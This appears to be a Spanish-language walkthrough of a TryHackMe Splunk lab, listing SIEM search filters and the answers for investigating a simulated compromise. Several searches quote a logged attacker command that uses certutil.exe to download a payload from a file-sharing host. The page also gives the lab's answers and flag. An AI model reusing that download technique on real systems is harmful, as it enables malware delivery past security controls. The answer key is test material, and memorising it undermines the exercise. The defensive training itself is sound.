- --
- Tags: #splunk #siem 
- - -
**TRYHACKME**

*Pregunta 1*
¿Cuántos logs se han ingerido en marzo de 2022?
Filtro: `index=*`

![Pasted image 20260115130249](../Fotos/Pasted%20image%2020260115130249.png)

Respuesta: 13959

*Pregunta 2*
Alerta de impostor: Parece que hay una cuenta de impostor observada en los registros, ¿cuál es el nombre de ese usuario?
El comando tabla ayuda a listar todos los resultados que aparecen en el campo de nombre de usuario. El comando de deduplicación ayuda a eliminar resultados duplicados.
Filtro:
```
index=* UserName="*" 
|  table UserName 
| dedup UserName
```

![Pasted image 20260115133338](../Fotos/Pasted%20image%2020260115133338.png)

Respuesta: Amel1a

*Pregunta 3*
¿Qué usuario del departamento de RRHH se observó ejecutando tareas programadas?
Filtro:
`index="win_eventlogs" UserName (Haroon OR Chris OR Diana) schtasks.exe`

![Pasted image 20260115135339](../Fotos/Pasted%20image%2020260115135339.png)

Respuesta: Chris.fort

*Pregunta 4*
¿Qué usuario del departamento de RRHH ejecutó un proceso del sistema (LOLBIN) para descargar una carga útil desde un host de intercambio de archivos?
**LOLBIN (Living Off The Land Binary)**: binario legítimo usado con fines maliciosos.
Filtro: 
`index=* (UserName=haroon OR chris.fort OR Daina) | table CommandLine | dedup CommandLine`

![Pasted image 20260115140610](../Fotos/Pasted%20image%2020260115140610.png)

Abrimos event view
`index=* (UserName=haroon OR chris.fort OR Daina)  CommandLine=" certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe"`

![Pasted image 20260115140659](../Fotos/Pasted%20image%2020260115140659.png)

Respuesta: Haroon

*Pregunta 5*
Para saltarse los controles de seguridad, ¿qué proceso del sistema (lolbin) se usó para descargar una carga útil de internet?
`index=* (UserName=haroon OR chris.fort OR Daina)  CommandLine=" certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe"`

![Pasted image 20260115140808](../Fotos/Pasted%20image%2020260115140808.png)

Respuesta: certutil.exe

*Pregunta 6*
¿Cuál fue la fecha en que este binario fue ejecutado por el huésped infectado? formato (AAAAAAAAAA-MM-DD)
`index=* (UserName=haroon OR chris.fort OR Daina)  CommandLine=" certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe"`

![Pasted image 20260115141203](../Fotos/Pasted%20image%2020260115141203.png)

Respuesta:  2022-03-04

*Pregunta 7*
¿A qué sitio de terceros se accedió para descargar la carga maliciosa?
`index=* (UserName=haroon OR chris.fort OR Daina)  CommandLine=" certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe"`

![Pasted image 20260115153852](../Fotos/Pasted%20image%2020260115153852.png)

Respuesta: controlc.com

*Pregunta 8*
¿Cuál es el nombre del archivo que se guardó en la máquina anfitriona desde el servidor C2 durante la fase posterior a la explotación?
`index=* (UserName=haroon OR chris.fort OR Daina)  CommandLine=" certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe"`

![Pasted image 20260115154405](../Fotos/Pasted%20image%2020260115154405.png)

Respuesta: benign.exe

*Pregunta 9*
El archivo sospechoso descargado del servidor C2 contenía contenido malicioso con el patrón THM{..........}; ¿Cuál es ese patrón?

![Pasted image 20260115154613](../Fotos/Pasted%20image%2020260115154613.png)

Respuesta: `THM{KJ&*H^B0}`

*Pregunta 10*
¿A qué URL se conectó el host infectado?

![Pasted image 20260115154723](../Fotos/Pasted%20image%2020260115154723.png)

Respuesta: https://controlc.com/e4d11035